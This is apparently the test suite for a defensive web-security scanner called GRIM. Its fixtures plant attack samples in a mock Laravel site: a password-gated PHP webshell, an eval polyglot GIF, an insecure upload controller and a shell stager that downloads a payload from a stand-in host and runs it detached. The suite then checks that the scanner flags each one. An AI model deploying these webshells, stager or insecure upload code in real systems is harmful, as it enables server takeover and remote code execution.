"""GRIM test suite — stdlib only, runnable on Termux: python3 tests/test_tools.py"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tarfile
import tempfile
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "src"))

from grim.core.detector import detect_stack  # noqa: E402
from grim.core.report import render_json, render_markdown  # noqa: E402
from grim.engines.codepatterns import scan_code  # noqa: E402
from grim.engines.diffscan import diff_artifacts  # noqa: E402
from grim.engines.exposure import audit_exposure  # noqa: E402
from grim.engines.secrets import scan_secrets  # noqa: E402
from grim.tools import call_tool, tool_catalog  # noqa: E402

PASS = 0
FAIL = 0


def check(name: str, cond: bool, detail: str = "") -> None:
    global PASS, FAIL
    if cond:
        PASS += 1
        print(f"  ok   {name}")
    else:
        FAIL += 1
        print(f"  FAIL {name} {detail}")


def make_fixture(root: Path, compromised: bool = True) -> None:
    (root / "public").mkdir(parents=True, exist_ok=True)
    (root / "public" / "index.php").write_text("<?php echo 'home';")
    (root / "public" / "uploads").mkdir(parents=True, exist_ok=True)
    (root / "public" / "uploads" / "logo.png").write_bytes(b"\x89PNG\r\n\x1a\n" + b"0" * 64)
    (root / "composer.json").write_text(json.dumps({"require": {"laravel/framework": "^10.0"}}))
    (root / "app" / "Http" / "Controllers").mkdir(parents=True, exist_ok=True)
    (root / "app" / "Http" / "Controllers" / "FileController.php").write_text(
        "<?php\nclass FileController {\n"
        "  public function store($request) {\n"
        "    $v = $request->validate(['f' => 'required|mimes:'.$request->mimes]);\n"
        "    $ext = $request->file('f')->getClientOriginalExtension();\n"
        "    move_uploaded_file($_FILES['f']['tmp_name'], public_path('uploads/x.'.$ext));\n"
        "  }\n}\n"
    )
    if compromised:
        (root / "public" / "uploads" / "sample-a.php").write_text(
            "<?php\nsession_start();\n$K='secret';\n"
            "if(!isset($_SESSION['ok'])){echo '<form method=post>PASSWORD<input name=k></form>';die;}\n"
            "echo '<form>cmd<input name=cmd></form>';\n"
            "if(isset($_POST['cmd'])){ system($_POST['cmd']); }\n"
        )
        (root / "public" / "uploads" / "img").mkdir(parents=True, exist_ok=True)
        (root / "public" / "uploads" / "img" / "downloader.sh").write_text(
            "#!/bin/sh\n# multi-dir stager: try several dirs (some are noexec), download gz client, exec detached\n"
            "U=\"https://h.example.com/payload.gz\"\ncurl -fsSL -m300 \"$U\" -o /tmp/x.gz\n"
            "gunzip -c /tmp/x.gz > /tmp/.s123 && chmod 755 /tmp/.s123 && (cd /tmp && setsid ./.s123 &)\n"
        )
        (root / "public" / "uploads" / "payload.s").write_bytes(b"\x7fELF\x02\x01\x01" + b"\x00" * 512)
        (root / "public" / "uploads" / "lazy.gif").write_bytes(b"GIF89a" + b"\x00" * 16 + b"<?php eval($_POST['x']); ?>")
        (root / "public" / ".env").write_text("APP_ENV=production\nDB_PASSWORD=SuperSecret12345\n")
        (root / ".env").write_text("APP_KEY=base64:abcdefghijklmnop\nAWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY\n")


def test_detect() -> None:
    print("detect_stack")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root)
        d = detect_stack(str(root))
        fw = [s["framework"] for s in d["stacks"]]
        check("detects laravel", "laravel" in fw, str(d))
        check("finds web dir", any("public" in w for w in d["web_dirs"]), str(d["web_dirs"]))


def test_exposure() -> None:
    print("audit_exposure (dir)")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root, compromised=True)
        findings = audit_exposure(str(root))
        titles = " | ".join(f"{f.severity}:{f.title}" for f in findings)
        crit = [f for f in findings if f.severity == "critical"]
        check("php shell in uploads flagged", any("Executable" in f.title for f in crit), titles)
        check("ELF flagged", any("Native executable" in f.title for f in crit), titles)
        check("polyglot flagged", any("Polyglot" in f.title for f in crit), titles)
        check("stager flagged", any("stager" in f.title.lower() or "Detached" in f.title for f in crit), titles)
        check("webshell pattern flagged", any("Webshell" in f.title for f in crit), titles)
        check(".env in public flagged", any(".env" in f.title.lower() or "Environment" in f.title for f in crit), titles)


def test_exposure_archive() -> None:
    print("audit_exposure (tar.gz)")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root, compromised=True)
        archive = root / "backup.tar.gz"
        with tarfile.open(archive, "w:gz") as tf:
            tf.add(root / "public", arcname="public")
        findings = audit_exposure(str(archive))
        crit = [f for f in findings if f.severity == "critical"]
        check("archive: shell detected", any("Executable" in f.title for f in crit), str(len(crit)))
        check("archive: ELF detected", any("Native" in f.title for f in crit), "")


def test_code() -> None:
    print("scan_code")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root)
        findings = scan_code(str(root))
        t = " | ".join(f"{f.severity}:{f.title}" for f in findings)
        check("client mimes detected", any("request-controlled" in f.title for f in findings), t)
        check("command exec from request detected", any("Command execution" in f.title for f in findings), t)


def test_secrets() -> None:
    print("scan_secrets")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root)
        findings = scan_secrets(str(root))
        t = " | ".join(f"{f.severity}:{f.title}" for f in findings)
        check("env in public critical", any(f.severity == "critical" and ".env" in f.title for f in findings), t)
        check("AWS secret found", any("AWS" in f.title for f in findings), t)
        check("db password in env", any(".env secret" in f.title for f in findings), t)


def test_diff() -> None:
    print("diff_artifacts")
    with tempfile.TemporaryDirectory() as td:
        a = Path(td) / "a"
        b = Path(td) / "b"
        make_fixture(a, compromised=False)
        make_fixture(b, compromised=True)
        findings, stats = diff_artifacts(str(a), str(b))
        t = " | ".join(f"{f.severity}:{f.title}" for f in findings)
        check("added shell classified critical", any(f.severity == "critical" and "added" in f.tags for f in findings), t)
        check("stats count additions", stats["added"] >= 5, str(stats))
        check("summary present", any("drift summary" in f.title for f in findings), t)


def test_diff_wrapper() -> None:
    print("diff_artifacts (wrapper roots)")
    with tempfile.TemporaryDirectory() as td:
        base = Path(td)
        a_inner = base / "a" / "old_root"
        b_inner = base / "b" / "new_root"
        make_fixture(a_inner, compromised=False)
        make_fixture(b_inner, compromised=True)
        findings, stats = diff_artifacts(str(a_inner), str(b_inner))
        crit_added = [f for f in findings if f.severity == "critical" and "added" in f.tags]
        check("wrapper normalized: additions classified", len(crit_added) >= 1, str(stats))
        check("wrapper normalized: counts sane", stats["added"] >= 5 and stats["removed"] == 0, str(stats))


def test_source_dirs() -> None:
    print("source dirs not false-positive flagged")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root, compromised=False)
        vendor = root / "vendor" / "maatwebsite" / "excel" / "src" / "Files"
        vendor.mkdir(parents=True, exist_ok=True)
        (vendor / "Disk.php").write_text("<?php class Disk { public function x() {} }")
        views = root / "resources" / "views" / "seller" / "uploads"
        views.mkdir(parents=True, exist_ok=True)
        (views / "create.blade.php").write_text("<div>hi</div><?php echo e($x); ?>")
        findings = audit_exposure(str(root))
        bad = [f for f in findings if "Executable" in f.title and ("/vendor/" in f.location["file"] or "resources/" in f.location["file"])]
        check("no name flags in vendor/resources", not bad, str([f.location["file"] for f in bad]))
        (vendor / "shell.php").write_text("<?php eval($_POST['x']);")
        findings2 = audit_exposure(str(root))
        hit = [f for f in findings2 if f.severity == "critical" and f.location["file"].endswith("vendor/maatwebsite/excel/src/Files/shell.php")]
        check("webshell content inside vendor still caught", bool(hit), str([f.title for f in findings2]))


def test_clean_scan() -> None:
    print("clean fixture (no critical false positives)")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root, compromised=False)
        # remove the vuln controller: this is the clean case
        (root / "app" / "Http" / "Controllers" / "FileController.php").unlink()
        (root / ".env").write_text("APP_KEY=base64:localonly\n")
        findings = audit_exposure(str(root))
        crit = [f for f in findings if f.severity == "critical"]
        check("no critical on clean tree", len(crit) == 0, " | ".join(f.title for f in crit))
        sc = scan_code(str(root))
        check("no critical code findings", len([f for f in sc if f.severity == "critical"]) == 0)


def test_report() -> None:
    print("report")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root)
        findings = audit_exposure(str(root))
        md = render_markdown(findings, {"target": str(root)})
        js = render_json(findings, {"target": str(root)})
        check("markdown renders", "# GRIM Security Report" in md)
        check("json parses", json.loads(js)["summary"]["total"] == len(findings))


def test_tools_api() -> None:
    print("tool registry")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        make_fixture(root)
        names = {t["name"] for t in tool_catalog()}
        check("all v1 tools registered", names >= {"detect_stack", "audit_deps", "scan_secrets", "scan_code", "audit_exposure", "diff_artifacts", "report", "scan"}, str(names))
        res = call_tool("scan", {"path": str(root), "network": False})
        check("scan orchestrator ok", res.get("ok") is True and res["summary"]["total"] > 0, str(res.get("error")))
        res2 = call_tool("nope", {})
        check("unknown tool errors cleanly", res2.get("ok") is False)


def test_mcp_stdio() -> None:
    print("mcp server handshake")
    env = dict(os.environ)
    env["PYTHONPATH"] = str(ROOT / "src")
    proc = subprocess.Popen(
        [sys.executable, "-m", "grim", "mcp"],
        stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
        text=True, env=env,
    )
    try:
        def send(obj: dict) -> dict:
            proc.stdin.write(json.dumps(obj) + "\n")
            proc.stdin.flush()
            line = proc.stdout.readline()
            return json.loads(line)

        init = send({"jsonrpc": "2.0", "id": 1, "method": "initialize", "params": {"protocolVersion": "2024-11-05", "capabilities": {}, "clientInfo": {"name": "test", "version": "0"}}})
        check("initialize ok", init.get("result", {}).get("serverInfo", {}).get("name") == "grim", str(init))
        tools = send({"jsonrpc": "2.0", "id": 2, "method": "tools/list", "params": {}})
        check("tools/list ok", any(t["name"] == "audit_exposure" for t in tools.get("result", {}).get("tools", [])), str(tools)[:200])
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            make_fixture(root)
            call = send({"jsonrpc": "2.0", "id": 3, "method": "tools/call", "params": {"name": "audit_exposure", "arguments": {"path": str(root)}}})
            content = call.get("result", {}).get("content", [{}])[0].get("text", "")
            check("tools/call returns findings", '"critical"' in content, content[:200])
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()


def test_deps_offline_note() -> None:
    print("audit_deps (network optional)")
    with tempfile.TemporaryDirectory() as td:
        root = Path(td)
        (root / "package.json").write_text(json.dumps({"dependencies": {"lodash": "4.17.15"}}))
        res = call_tool("audit_deps", {"path": str(root)})
        if res.get("ok"):
            total = res.get("summary", {}).get("total", 0)
            check("osv query executed (lodash 4.17.15 has known vulns)", total >= 1, f"total={total}")
        else:
            check("osv query executed", False, res.get("error", "unknown"))


if __name__ == "__main__":
    print(f"GRIM tests — {ROOT}")
    test_detect()
    test_exposure()
    test_exposure_archive()
    test_code()
    test_secrets()
    test_diff()
    test_diff_wrapper()
    test_source_dirs()
    test_clean_scan()
    test_report()
    test_tools_api()
    test_mcp_stdio()
    test_deps_offline_note()
    print(f"\n{PASS} passed, {FAIL} failed")
    sys.exit(1 if FAIL else 0)
